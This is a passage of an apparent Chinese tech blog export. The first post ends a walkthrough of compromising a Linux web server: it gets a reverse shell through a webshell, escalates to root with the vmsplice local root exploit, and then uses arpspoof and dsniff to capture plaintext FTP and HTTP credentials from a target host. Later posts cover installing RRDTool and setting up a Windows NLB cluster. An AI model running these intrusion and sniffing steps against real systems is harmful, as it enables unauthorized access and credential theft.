2.6.20-1.2962.fc6 &rdquo;，Linux内核是2.6.20的。<br />在提权时，要用到gcc进行编译，刺探一下系统有没有安装，执行命令，<br />#gcc &ndash;help<br /><br />发现可以运行gcc,并且系统管理员没对使用shell和gcc进行限制，在也是个安全缺失。<br /><br />在寻找本地提权利用程序时，通常是根据系统版本来进行，应用程序的本地提权也是一样的。在网上就有可供查询的网站，比如<a href=\"http://www.milw0rm.com/\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.milw0rm.com/</a>网站如图</p><p><img small=\"0\" src=\"/images/pic/d227f7f8257cc2bcb901a0cb.jpg\" /><br />发现可利用的漏洞还真不少。<br /><br />本地提权是需要个交互式的shell的。在本机监听端口如下：<br /><br />利用WebShell自带的反弹功能直接连接本地的12345端口并返回shell</p><p><img small=\"0\" src=\"/images/pic/d6190e7e92d902d32e73b3d5.jpg\" /></p><p>连接成功后，就能得到一个apache用户的shell<br />，但有时如果不能交互时，可以直接执行，<br /># python &ndash;c &lsquo;impotr pty;pty.spawn(&ldquo;/bin/sh&rdquo;);&rsquo;<br />来得到交互的Shell,一般的系统都默认安装python</p><p><img small=\"0\" src=\"/images/pic/05fa8aff3278251c4f4aead6.jpg\" /></p><p>提示成功了，可以新建个目录用来存放提权的工具。</p><p><img small=\"0\" src=\"/images/pic/162231f3e724d01c720eecde.jpg\" /><br /></p><p>在Linux提权大致可分为，第三方软件漏洞、本地信任特性、内核溢出等，比较常用的溢出率高的，当属内核了。用Wget下载溢出源码，用到的漏洞是Linux vmsplice Local Root Exploit<br />，成功率蛮高的，gcc编译，执行，</p><p><img small=\"0\" src=\"/images/pic/d745d3fc9c311931d9f9fda5.jpg\" /><br /></p><p>成功获取root权限，在选择溢出利用程序时，有时需要进行多次测试。<br /><br />什么是Sniffer，sniffer是利用截获目的的计算机通信，通过分析截获的数据，提取敏感信息的工具。但其通过什么方法来截获数据呢？在此之前得解释一下arp（Address Rrsolution Protocol）协议,即地址解析协议，它位于TCP/IP协议栈中的低层协议，负责将某个IP地址解析成对应的MAC地址。它靠维持在内存中保存的一张表来使IP得以在网络上被目标机器应答。在数据传送时，IP包里就有源IP地址、源MAC地址、目标IP地址，如果在ARP表中有相对应的MAC地点，那么根据最优选择法，直接访问，如果，没有对应的地址，就要广播出去，在网内寻找对应的地址，如果对方的IP地址和发出的目标IP地址相同，那么对方会发送MAC地址给源主机，，而此时，如果攻击者也接听到发送的IP地址，它就会仿冒目标主机的IP地址，然后返回自己的主机的MAC地址给源主机，因为源主机发送的IP包没有包括目标主机的MAC地址，而ARP表里面又没有目标IP和目标MAC地址的对应表，就会接受攻击者的MAC而选择与其通信，所以就此产生了ARP欺骗。在系统刚启动时，可以在DOS下输入命令&ldquo;arp -a&rdquo;来查看本机arp缓存表的内容</p><p><img small=\"0\" src=\"/images/pic/2f3f5f0d314238f13bc763a7.jpg\" /><br />我们来与IP192.168.0.5进行通信，通信后arp缓存表就会有这样一条MAC地址和IP对应的记录</p><p><img small=\"0\" src=\"/images/pic/f4c3451adf8946ca1bd576b1.jpg\" /><br /></p><p>在本机多了条缓存中的IP和MAC的对应纪录。<br /><br />Dsniff是一个著名的网络嗅探工具包，其开发者是Dug Song，其开发的本意是用来揭示网络通信的不安全性，方便网络管理员对自己网络的审计，当然也包括渗透测试，其安装包里某此工具，充分揭示了协议的不安全性。作为一个工具集，Dsniff包括的工具大致分为四类：<br />一、 纯粹被动地进行网络活动监视的工具，包括：dsniff、filesnarf、mailsnaf、msgsnarf、urlsnarf、webspy<br />二、 针对SSH和SSL的MITM&ldquo;攻击&rdquo;工具，包括sshmitm和webmitm<br />三、 发起主动欺骗的工具，包括：arpspoof、dnsspof、macof<br />四、 其它工具，包括tcpkill、tcpnice<br /><br />Dsniff的官方下载：<a href=\"http://www.monkey.org/~dugsong/dsniff/\" target=\"_blank\" rel=\"noopener noreferrer\">www.monkey.org/~dugsong/dsniff/</a> 这个是源码包，解压后可以看下README,提示需要五个软件的支持：openssl、Berkeley_db、libnet、libpca、libnids<br />下载地址如下：<br />Berkeley_db: <a href=\"http://www.oracle.com/technology/software/products/berkeley-db/index.html\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.oracle.com/technology ... keley-db/index.html</a><br />libpcap: <a href=\"http://www.tcpdump.org/release/libpcap-1.0.0.tar.gz\" target=\"_blank\" rel=\"noopener noreferrer\">http://www.tcpdump.org/release/libpcap-1.0.0.tar.gz</a><br /><br /><br /><br />系统一般默认都有安装openssl、libpcap。</\np><ol> <li>一、        Tar包安装<br /> </li> <li>如果下载的是源包，文件如下：openssl-0.9.7i.tar.gz、libnids-1.18.tar.gz、libpcap-0.7.2.tar.gz、libnet-1.0.2a.tar.gz、Berkeley db-4.7.25.tar.gz<br /> </li> <li>a)        安装openssl<br /> </li> <li>用tar解压软件包手，执行三条命令<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>b)        安装libpcap<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>c)        安装libnet<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>d)        安装libnids<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>e)        安装libnids<br /> </li> <li>#./config<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>f)        安装Berkeley DB<br /> </li> <li>#.cd build_unix<br /> </li> <li>#../dist/configure<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>g)        安装dsniff<br /> </li> <li>#./configure<br /> </li> <li>#make<br /> </li> <li>#make install<br /> </li> <li>程序安装好后，先查看一下网卡信息，然后开启服务器IP转发，命令如下：<br /> </li> <li># echo &quot;1&quot; &amp;gt; /proc/sys/net/ipv4/ip_forward</li></ol><em>复制代码</em><p>先来双向欺骗，用到arpspoof，其命令是：<br />#arp &ndash;t 网关 欺骗主机IP</p><p><img small=\"0\" src=\"/images/pic/8ab572e964e6c3eab31cb1bd.jpg\" /></p><p>arpspoof已经开始工作了，可以用tcpdump查看一下被攻击主机是否有数据经过<br />命令如下：<br />#tcpdump &ndash;I eth0 host 61.67.x.115</p><p><img small=\"0\" src=\"/images/pic/f9760116f08cf86ff819b8bf.jpg\" /><br /><br />有数据交换，说明欺骗的比较成功，然后用Dsniff开始嗅探目标主机，命令如下：<br />#Dsniff &ndash;c &ndash;f /etc/dsniff/dsniff.services<br />这个dsniff.services自然就是保存端口和服务对应关系的文件，如需要保存到文件，需加-w filename数据全是明文传送的。所以数据分析完全能用肉眼发现</p><p><img small=\"0\" src=\"/images/pic/30581d2958b3600a349bf7b9.jpg\" /></p><p>从这条数据可以看到HTTP登录和FTP登录信息，帐号和密码全是明文的。而经过测试，通过FTP上传的目录正是WEB目录，获取WEBShell权限，继续提权即可控制主机。Linux下的嗅探，其实更容易一些，在最近爆出的高危本地提权，不知道有多少台主机沦陷呢？在攻与防的游戏里，系统管理员往往显得如此的无助。</p><p> </p>"},{"title":"linux下RRDTool安装方法","date":"2011-09-08T05:35:00.000Z","_content":"<p>一、使用yum安装：<br />在 /etc/yum.repos.d/下面新建dag.repo文件在文件中输入源地址：<br />[root@hmg2 yum.repos.d]# cat dag.repo<br />[dag]<br />name=Dag RPM Repository for Red Hat Enterprise Linux<br />baseurl=http://apt.sw.be/redhat/el$releasever/en/$basearch/dag<br />gpgcheck=1<br />gpgkey=http://dag.wieers.com/rpm/packages/RPM-GPG-KEY.dag.txt<br />enabled=1<br />[root@hmg2 yum.repos.d]#yum -y install rrdtool<br />这样就可以完成RRDTool安装……<br />二、软件包安装：<br />先yum安装所要的库文件：<br />[root@hmg2 yum.repos.d]#yum install cairo-devel libxml2-devel pango-devel pango libpng-devel freetype freetype-devel libart_lgpl-devel<br />然后下载rrdtool包，安装：<br />[root@hmg2 src]#wget http://oss.oetiker.ch/rrdtool/pub/rrdtool-1.3.1.tar.gz<br />[root@hmg2 src]#tar -zxvf rrdtool-1.3.1.tar.gz<br />[root@hmg2 src]#./configure –prefix=/usr/local/rrdtool &amp;&amp; make &amp;&amp; make install<br />运行rrdtool –v测试安装成功没有：<br />[root@hmg2 src]#rrdtool -v //可以看到RRDTool的用法以及版本信息</p><p>三、另一种yum安装<br />[root@hmg2 src]#wget http://packages.sw.be/rpmforge-release/rpmforge-release-0.3.6-1.el5.rf.i386.rpm<br />[root@hmg2 src]#rpm -ivh rpmforge-release-0.3.6-1.el5.rf.i386.rpm<br />[root@hmg2 src]#yum -y install rrdtool*</p><p> </p><p><a target=\"_blank\" href=\"http://www.smartsecur.com.cn\" rel=\"noopener noreferrer\"></a></p><p><a target=\"_blank\" href=\"http://www.smartsecur.com.cn\" rel=\"noopener noreferrer\"></a></p>","source":"_posts/linux下RRDTool安装方法.md","raw":"title: linux下RRDTool安装方法\ncategories: [操作系统,Linux]\ntags: []\ndate: 2011-09-08 13:35:00\n---\n<p>一、使用yum安装：<br />在 /etc/yum.repos.d/下面新建dag.repo文件在文件中输入源地址：<br />[root@hmg2 yum.repos.d]# cat dag.repo<br />[dag]<br />name=Dag RPM Repository for Red Hat Enterprise Linux<br />baseurl=http://apt.sw.be/redhat/el$releasever/en/$basearch/dag<br />gpgcheck=1<br />gpgkey=http://dag.wieers.com/rpm/packages/RPM-GPG-KEY.dag.txt<br />enabled=1<br />[root@hmg2 yum.repos.d]#yum -y install rrdtool<br />这样就可以完成RRDTool安装……<br />二、软件包安装：<br />先yum安装所要的库文件：<br />[root@hmg2 yum.repos.d]#yum install cairo-devel libxml2-devel pango-devel pango libpng-devel freetype freetype-devel libart_lgpl-devel<br />然后下载rrdtool包，安装：<br />[root@hmg2 src]#wget http://oss.oetiker.ch/rrdtool/pub/rrdtool-1.3.1.tar.gz<br />[root@hmg2 src]#tar -zxvf rrdtool-1.3.1.tar.gz<br />[root@hmg2 src]#./configure –prefix=/usr/local/rrdtool &amp;&amp; make &amp;&amp; make install<br />运行rrdtool –v测试安装成功没有：<br />[root@hmg2 src]#rrdtool -v //可以看到RRDTool的用法以及版本信息</p><p>三、另一种yum安装<br />[root@hmg2 src]#wget http://packages.sw.be/rpmforge-release/rpmforge-release-0.3.6-1.el5.rf.i386.rpm<br />[root@hmg2 src]#rpm -ivh rpmforge-release-0.3.6-1.el5.rf.i386.rpm<br />[root@hmg2 src]#yum -y install rrdtool*</p><p> </p><p><a target=\"_blank\" href=\"http://www.smartsecur.com.cn\" rel=\"noopener noreferrer\"></a></p><p><a target=\"_blank\" href=\"http://www.smartsecur.com.cn\" rel=\"noopener noreferrer\"></a></p>","slug":"linux下RRDTool安装方法","published":1,"updated":"2023-04-22T05:46:47.808Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgrk6tpw00028opifelb3i3w","content":"<p>一、使用yum安装：<br />在 /etc/yum.repos.d/下面新建dag.repo文件在文件中输入源地址：<br />[root@hmg2 yum.repos.d]# cat dag.repo<br />[dag]<br />name=Dag RPM Repository for Red Hat Enterprise Linux<br />baseurl=http://apt.sw.be/redhat/el$releasever/en/$basearch/dag<br />gpgcheck=1<br />gpgkey=http://dag.wieers.com/rpm/packages/RPM-GPG-KEY.dag.txt<br />enabled=1<br />[root@hmg2 yum.repos.d]#yum -y install rrdtool<br />这样就可以完成RRDTool安装……<br />二、软件包安装：<br />先yum安装所要的库文件：<br />[root@hmg2 yum.repos.d]#yum install cairo-devel libxml2-devel pango-devel pango libpng-devel freetype freetype-devel libart_lgpl-devel<br />然后下载rrdtool包，安装：<br />[root@hmg2 src]#wget http://oss.oetiker.ch/rrdtool/pub/rrdtool-1.3.1.tar.gz<br />[root@hmg2 src]#tar -zxvf rrdtool-1.3.1.tar.gz<br />[root@hmg2 src]#./configure –prefix=/usr/local/rrdtool &amp;&amp; make &amp;&amp; make install<br />运行rrdtool –v测试安装成功没有：<br />[root@hmg2 src]#rrdtool -v //可以看到RRDTool的用法以及版本信息</p><p>三、另一种yum安装<br />[root@hmg2 src]#wget http://packages.sw.be/rpmforge-release/rpmforge-release-0.3.6-1.el5.rf.i386.rpm<br />[root@hmg2 src]#rpm -ivh rpmforge-release-0.3.6-1.el5.rf.i386.rpm<br />[root@hmg2 src]#yum -y install rrdtool*</p><p> </p><p><a target=\"_blank\" href=\"http://www.smartsecur.com.cn\" rel=\"noopener noreferrer\"></a></p><p><a target=\"_blank\" href=\"http://www.smartsecur.com.cn\" rel=\"noopener noreferrer\"></a></p>","site":{"data":{}},"excerpt":"","more":"<p>一、使用yum安装：<br />在 /etc/yum.repos.d/下面新建dag.repo文件在文件中输入源地址：<br />[root@hmg2 yum.repos.d]# cat dag.repo<br />[dag]<br />name=Dag RPM Repository for Red Hat Enterprise Linux<br />baseurl=http://apt.sw.be/redhat/el$releasever/en/$basearch/dag<br />gpgcheck=1<br />gpgkey=http://dag.wieers.com/rpm/packages/RPM-GPG-KEY.dag.txt<br />enabled=1<br />[root@hmg2 yum.repos.d]#yum -y install rrdtool<br />这样就可以完成RRDTool安装……<br />二、软件包安装：<br />先yum安装所要的库文件：<br />[root@hmg2 yum.repos.d]#yum install cairo-devel libxml2-devel pango-devel pango libpng-devel freetype freetype-devel libart_lgpl-devel<br />然后下载rrdtool包，安装：<br />[root@hmg2 src]#wget http://oss.oetiker.ch/rrdtool/pub/rrdtool-1.3.1.tar.gz<br />[root@hmg2 src]#tar -zxvf rrdtool-1.3.1.tar.gz<br />[root@hmg2 src]#./configure –prefix=/usr/local/rrdtool &amp;&amp; make &amp;&amp; make install<br />运行rrdtool –v测试安装成功没有：<br />[root@hmg2 src]#rrdtool -v //可以看到RRDTool的用法以及版本信息</p><p>三、另一种yum安装<br />[root@hmg2 src]#wget http://packages.sw.be/rpmforge-release/rpmforge-release-0.3.6-1.el5.rf.i386.rpm<br />[root@hmg2 src]#rpm -ivh rpmforge-release-0.3.6-1.el5.rf.i386.rpm<br />[root@hmg2 src]#yum -y install rrdtool*</p><p> </p><p><a target=\"_blank\" href=\"http://www.smartsecur.com.cn\" rel=\"noopener noreferrer\"></a></p><p><a target=\"_blank\" href=\"http://www.smartsecur.com.cn\" rel=\"noopener noreferrer\"></a></p>"},{"title":"构建网络负载平衡(NLB)","date":"2010-03-23T04:46:00.000Z","_content":"<strong>[转]构建网络负载平衡(NLB)</strong>                                                         作者：佚名&#160;&#160;&#160;&#160;厚朴教育来源：<a href=\"http://ce.sysu.edu.cn/hope/ShowCopyFrom.asp?ChannelID=1007&amp;SourceName=%E4%BD%9A%E5%90%8D\">佚 名</a>&#160;&#160;&#160;                                        　　NLB群集允许用户把两台或更多的服务器结合起来使用，在客户端看起来就像是一台服务器。进入NLB群集的连接 请求可以分解传送给两个或更多的NLB群集成员，这样用户可以添加越来越多的服务器(最多32台)，形成一个功能非常强大的FTP站点或Web站点            <p>　　当把一台服务器(包括Web服务器、FTP服务器或者流媒体服务器等等)放入网络中之后，随着客户端数量的不断增  加，人们往往需要功能更强大、处理速度更快的服务器。为了解决这个问题，如果将原有的服务器替换成功能更强大、处理速度更快的服务器显然并不是值得称道的  办法。但是如果能把新服务器添加到原有服务器的处理能力基础上而不是替换它，这种方案毫无疑问更容易被用户接受。网络负载平衡(Network  Load Balancing，NLB)群集的出现正好实现了这一目的。</p> <p>　　NLB群集最早出现在Windows 2000 Server的Advanced Server系统中，在Windows Server  2003的各个版本中均提供了此项功能。NLB群集允许用户把两台或更多的服务器结合起来使用，在客户端看起来就像是一台服务器。进入NLB群集的连接请  求可以分解传送给两个或更多的NLB群集成员，这样用户可以添加越来越多的服务器(最多32台)，形成一个功能非常强大的FTP站点或Web站点。</p> <p>　　在NLB群集中，每台服务器都会有一个属于自己的静态IP地址，但NLB群集中的所有服务器还有一个共同的IP地址—NLB群集地址。客户端可   以通过这个IP地址连接到NLB群集，就像连接到其它IP地址一样。当有客户端请求连接到这个共享的IP地址时，NLB群集会将每个访问请求指派一个具体  的群集成员。</p> <p>　　尽管NLB群集是一种非常简洁的工具，但安装配置NLB群集必须满足很严格的要求，譬如首先要保证群集中服务器必须能够正常的单独运行。以安装 配置两节点的NLB群集为例，这些条件简述如下：</p> <p>　　(1)每个节点服务器必须拥有一个静态IP地址，另外还应该为NLB群集准备一个静态IP地址。</p> <p>　　(2)NLB群集需要拥有一个DNS名称，且该DNS记录项应该与区群集IP地址建立了映射关系。</p> <p>　　(3)每个节点服务器上应该安装完全相同的服务器软件(如IIS、终端服务器等网络服务)，以构成一个两节点的NLB群集。</p> <p>　　在接下来的内容中将介绍如何安装配置一个较为简单的NLB群集—拥有两个节点的Web服务器群集。所要安装配置的服务器群集环境为：两台运行  Windows Server 2003 Enterprise  Edition的服务器，可以将其称为节点1和节点2。由于所有的NLB群集成员必须使用属于相同子网的静态IP地址，因此准备为节点1分配的静态IP地  址为“10.115.223.1”，准备为节点2分配的静态IP地址为“10.1115.223.2”，为NLB群集分配的IP地址是  10.115.223.10。对NLB和配置环境了解之后，现在就可以进行详细的操作了。</p> <p>　　NLB群集中的每一个节点拥有一个静态IP地址是安装配置NLB群集的首要且必要条件。我们首先为节点1进行配置。</p> <p>　　在节点1服务器的桌面上右击“网上邻居”，打开“网络连接”窗口。然后右键单击“本地连接”图标，执行“属性”快捷命令，打开“本地连接  属性”对话框。</p> <p>　　在“本地连接 属性”对话框中双击“Internet 协议(TCP/IP)”选项，打开“Internet 协议(TCP/IP)  属性”对话框。在常规选项卡中点选“使用下面的IP地址”单选框，并指定静态IP地址。本例使用IP地址为“10.115.223.1”，子网掩码为  “255.255.254.0”，默认网关为“10.115.223.254”，DNS服务器地址为“10.115.223.1”(如图1)。</p> <p>　　</p> <p><img width=\"404\" height=\"443\" title=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" alt=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" src=\"http://ce.sysu.edu.cn/hope/Education/UploadFiles_5303/201001/20100113204258559.jpg\" /></p> <p>　　图1</p> <p>　　在Windows Server 2003中安装部署Web服务需要IIS 6.0的支持，但是在默认情况下IIS  6.0组件并没有被安装，因此手动安装IIS 6.0组件。</p> <p>　　在“控制面板”中双击“添加或删除程序”图标，在打开的“添加或删除程序”对话框中单击“添加/删除Windows组件”按钮，打开 “Windows组件向导”对话框。</p> <p>　　在“组件”列表中找到并双击“应用程序服务器”复选框，在打开的“应用程序服务器”对话框中双击“Internet信息服务(IIS)”选项，   打开“Internet信息服务(IIS)”对话框。在子组件列表中找到并勾选“万维网服务”复选框，依次单击“确定/确定/下一步”按钮开始安装。最后  单击“完成”按钮结束安装过程(如图2)。</p> <p>　　</p> <p><img width=\"449\" height=\"345\" title=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" alt=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" src=\"http://ce.sysu.edu.cn/hope/Education/UploadFiles_5303/201001/20100113204301391.jpg\" /></p> <p>　　图2</p> <p>　　用同样的方法为节点2安装Web服务器组件。</p> <br /> <p><strong>三、创建群集主机记录</strong></p> <p>　　在安装NLB群集之前建议先把DNS准备好，在本例中节点1同时也是网络中的DNS服务器。可以在节点1上为群集指派一个DNS名称，依次单击 “开始/所有程序/管理工具/DNS”，打开“dnsmagt”窗口。</p> <p>　　在左窗格中依次展开“ServerName/正向查找区域”目录。然后右击域名“cpcw.com”区域，执行“新建主机”快捷命令(如图 3)。</p> <p>　　</p> <p><img width=\"550\" height=\"371\" title=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" alt=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" src=\"http://ce.sysu.edu.cn/hope/Education/UploadFiles_5303/201001/20100113204302983.jpg\" /></p> <p>　　图3</p> <p>　　在打开“新建主机”对话框  “名称”编辑框中键入一个自定义的群集名称(本例键入“Cluster”);在“IP地址”编辑框中键入准备该群集指派的静态IP地址(本例为  “10.115.223.10”)。单击“添加主机”按钮，很快就会提示已经成功创建了主机记录(如图4)。</p> <p>　　</p> <p><img width=\"347\" height=\"300\" title=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" alt=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" src=\"http://ce.sysu.edu.cn/hope/Education/UploadFiles_5303/201001/20100113204304650.jpg\" /></p> <p>　　图4</p> <p><strong>四、在节点1上安装配置NLB</strong></p> <p>　　完成各项准备准备工作以后，就可以安装配置NLB群集了。对于两个节点而言，先在哪一个节点上安装配置NLB群集都是可以的。下面我们将在节点 1上进行安装配置。</p> <p>　　在节点1的桌面上右击“网上邻居”图标，打开“网络连接”窗口。然后右键单击“本地连接”图标，执行“属性”快捷命令，打开“本地连接  属性”对话框。</p> <p>　　观察“此连接使用下列项目”列表可以发现，默认情况下并没有选中“网络负载平衡”复选框。勾选该复选框(如图5)，然后单击“属性”按钮，打开  “网络负载平衡  属性”对话框。在“群集IP地址”区域，设置NLB群集IP地址为“10.115.223.10”，该地址供群\n","source":"_posts/构建网络负载平衡(NLB).md","raw":"title: 构建网络负载平衡(NLB)\ncategories: [网络工程]\ntags: []\ndate: 2010-03-23 12:46:00\n---\n<strong>[转]构建网络负载平衡(NLB)</strong>                                                         作者：佚名&#160;&#160;&#160;&#160;厚朴教育来源：<a href=\"http://ce.sysu.edu.cn/hope/ShowCopyFrom.asp?ChannelID=1007&amp;SourceName=%E4%BD%9A%E5%90%8D\">佚 名</a>&#160;&#160;&#160;                                        　　NLB群集允许用户把两台或更多的服务器结合起来使用，在客户端看起来就像是一台服务器。进入NLB群集的连接 请求可以分解传送给两个或更多的NLB群集成员，这样用户可以添加越来越多的服务器(最多32台)，形成一个功能非常强大的FTP站点或Web站点            <p>　　当把一台服务器(包括Web服务器、FTP服务器或者流媒体服务器等等)放入网络中之后，随着客户端数量的不断增  加，人们往往需要功能更强大、处理速度更快的服务器。为了解决这个问题，如果将原有的服务器替换成功能更强大、处理速度更快的服务器显然并不是值得称道的  办法。但是如果能把新服务器添加到原有服务器的处理能力基础上而不是替换它，这种方案毫无疑问更容易被用户接受。网络负载平衡(Network  Load Balancing，NLB)群集的出现正好实现了这一目的。</p> <p>　　NLB群集最早出现在Windows 2000 Server的Advanced Server系统中，在Windows Server  2003的各个版本中均提供了此项功能。NLB群集允许用户把两台或更多的服务器结合起来使用，在客户端看起来就像是一台服务器。进入NLB群集的连接请  求可以分解传送给两个或更多的NLB群集成员，这样用户可以添加越来越多的服务器(最多32台)，形成一个功能非常强大的FTP站点或Web站点。</p> <p>　　在NLB群集中，每台服务器都会有一个属于自己的静态IP地址，但NLB群集中的所有服务器还有一个共同的IP地址—NLB群集地址。客户端可   以通过这个IP地址连接到NLB群集，就像连接到其它IP地址一样。当有客户端请求连接到这个共享的IP地址时，NLB群集会将每个访问请求指派一个具体  的群集成员。</p> <p>　　尽管NLB群集是一种非常简洁的工具，但安装配置NLB群集必须满足很严格的要求，譬如首先要保证群集中服务器必须能够正常的单独运行。以安装 配置两节点的NLB群集为例，这些条件简述如下：</p> <p>　　(1)每个节点服务器必须拥有一个静态IP地址，另外还应该为NLB群集准备一个静态IP地址。</p> <p>　　(2)NLB群集需要拥有一个DNS名称，且该DNS记录项应该与区群集IP地址建立了映射关系。</p> <p>　　(3)每个节点服务器上应该安装完全相同的服务器软件(如IIS、终端服务器等网络服务)，以构成一个两节点的NLB群集。</p> <p>　　在接下来的内容中将介绍如何安装配置一个较为简单的NLB群集—拥有两个节点的Web服务器群集。所要安装配置的服务器群集环境为：两台运行  Windows Server 2003 Enterprise  Edition的服务器，可以将其称为节点1和节点2。由于所有的NLB群集成员必须使用属于相同子网的静态IP地址，因此准备为节点1分配的静态IP地  址为“10.115.223.1”，准备为节点2分配的静态IP地址为“10.1115.223.2”，为NLB群集分配的IP地址是  10.115.223.10。对NLB和配置环境了解之后，现在就可以进行详细的操作了。</p> <p>　　NLB群集中的每一个节点拥有一个静态IP地址是安装配置NLB群集的首要且必要条件。我们首先为节点1进行配置。</p> <p>　　在节点1服务器的桌面上右击“网上邻居”，打开“网络连接”窗口。然后右键单击“本地连接”图标，执行“属性”快捷命令，打开“本地连接  属性”对话框。</p> <p>　　在“本地连接 属性”对话框中双击“Internet 协议(TCP/IP)”选项，打开“Internet 协议(TCP/IP)  属性”对话框。在常规选项卡中点选“使用下面的IP地址”单选框，并指定静态IP地址。本例使用IP地址为“10.115.223.1”，子网掩码为  “255.255.254.0”，默认网关为“10.115.223.254”，DNS服务器地址为“10.115.223.1”(如图1)。</p> <p>　　</p> <p><img width=\"404\" height=\"443\" title=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" alt=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" src=\"http://ce.sysu.edu.cn/hope/Education/UploadFiles_5303/201001/20100113204258559.jpg\" /></p> <p>　　图1</p> <p>　　在Windows Server 2003中安装部署Web服务需要IIS 6.0的支持，但是在默认情况下IIS  6.0组件并没有被安装，因此手动安装IIS 6.0组件。</p> <p>　　在“控制面板”中双击“添加或删除程序”图标，在打开的“添加或删除程序”对话框中单击“添加/删除Windows组件”按钮，打开 “Windows组件向导”对话框。</p> <p>　　在“组件”列表中找到并双击“应用程序服务器”复选框，在打开的“应用程序服务器”对话框中双击“Internet信息服务(IIS)”选项，   打开“Internet信息服务(IIS)”对话框。在子组件列表中找到并勾选“万维网服务”复选框，依次单击“确定/确定/下一步”按钮开始安装。最后  单击“完成”按钮结束安装过程(如图2)。</p> <p>　　</p> <p><img width=\"449\" height=\"345\" title=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" alt=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" src=\"http://ce.sysu.edu.cn/hope/Education/UploadFiles_5303/201001/20100113204301391.jpg\" /></p> <p>　　图2</p> <p>　　用同样的方法为节点2安装Web服务器组件。</p> <br /> <p><strong>三、创建群集主机记录</strong></p> <p>　　在安装NLB群集之前建议先把DNS准备好，在本例中节点1同时也是网络中的DNS服务器。可以在节点1上为群集指派一个DNS名称，依次单击 “开始/所有程序/管理工具/DNS”，打开“dnsmagt”窗口。</p> <p>　　在左窗格中依次展开“ServerName/正向查找区域”目录。然后右击域名“cpcw.com”区域，执行“新建主机”快捷命令(如图 3)。</p> <p>　　</p> <p><img width=\"550\" height=\"371\" title=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" alt=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" src=\"http://ce.sysu.edu.cn/hope/Education/UploadFiles_5303/201001/20100113204302983.jpg\" /></p> <p>　　图3</p> <p>　　在打开“新建主机”对话框  “名称”编辑框中键入一个自定义的群集名称(本例键入“Cluster”);在“IP地址”编辑框中键入准备该群集指派的静态IP地址(本例为  “10.115.223.10”)。单击“添加主机”按钮，很快就会提示已经成功创建了主机记录(如图4)。</p> <p>　　</p> <p><img width=\"347\" height=\"300\" title=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" alt=\"构建网络负载平衡群集(NLB) - 落花往事 - 落花往事\" src=\"http://ce.sysu.edu.cn/hope/Education/UploadFiles_5303/201001/20100113204304650.jpg\" /></p> <p>　　图4</p> <p><strong>四、在节点1上安装配置NLB</strong></p> <p>　　完成各项准备准备工作以后，就可以安装配置NLB群集了。对于两个节点而言，先在哪一个节点上安装配置NLB群集都是可以的。下面我们将在节点 1上进行安装配置。</p> <p>　　在节点1的桌面上右击“网上邻居”图标，打开“网络连接”窗口。然后右键单击“本地连接”图标，执行“属性”快捷命令，打开“本地连接  属性”对话框。</p> <p>　　观察“此连接使用下列项目”列表可以发现，默认情况下并没有选中“网络负载平衡”复选框。勾选该复选框(如图5)，然后单击“属性”按钮，打开  “网络负载平衡  属性”对话框。在“群集IP地址”区域，设置NLB群集IP地址为“10.115.223.10”，该地址供群\n","slug":"构建网络负载平衡(NLB)","published":1,"updated":"2023-04-22T05:46:12.264Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgrk6tpx00038opie1ua7yx3","content":"<p><strong>[转]构建网络负载平衡(NLB)</strong>                                                         作者：佚名&amp;#160;&amp;#160;&amp;#160;&amp;#160;厚朴教育来源：<a href=\"http://ce.sysu.edu.cn/hope/ShowCopyFrom.asp?ChannelID=1007&amp;SourceName=%E4%BD%9A%E5%90%8D\">佚 名</a>&amp;#160;&amp;#160;&amp;#160;                                        　　NLB群集允许用户把两台或更多的服务器结合起来使用，在客户端看起来就像是一台服务器。进入NLB群集的连接 请求可以分解传送给两个或更多的NLB群集成员，这样用户可以添加越来越多的服务器(最多32台)，形成一个功能非常强大的FTP站点或Web站点            <p>　　当把一台服务器(包括Web服务器、FTP服务器或者流媒体服务器等等)放入网络中之后，随着客户端数量的不断增  加，人们往往需要功能更强大、处理速度更快的服务器。为了解决这个问题，如果将原有的服务器替换成功能更强大、处理速度更快的服务器显然并不是值得称道的  办法。但是如果能把新服务器添加到原有服务器的处理能力基础上而不是替换它，这种方案毫无疑问更容易被用户接受。网络负载平衡(Network  Load Balancing，NLB)群集的出现正好实现了这一目的。</p> <p>　　NLB群集最早出现在Windows 2000 Server的Advanced Server系统中，在Windows Server  2003的各个版本中均提供了此项功能。NLB群集允许用户把两台或更多的服务器结合起来使用，在客户端看起来就像是一台服务器。进入NLB群集的连接请  求可以分解传送给两个或更多的NLB群集成员，这样用户可以添加越来越多的服务器(最多32台)，形成一个功能非常强大的FTP站点或Web站点。</p> <p>　　在NLB群集中，每台服务器都会有一个属于自己的静态IP地址，但NLB群集中的所有服务器还有一个共同的IP地址—NLB群集地址。客户端可   以通过这个IP地址连接到NLB群集，就像连接到其它IP地址一样。当有客户端请求连接到这个共享的IP地址时，NLB群集会将每个访问请求指派一个具体  的群集成员。</p> <p>　　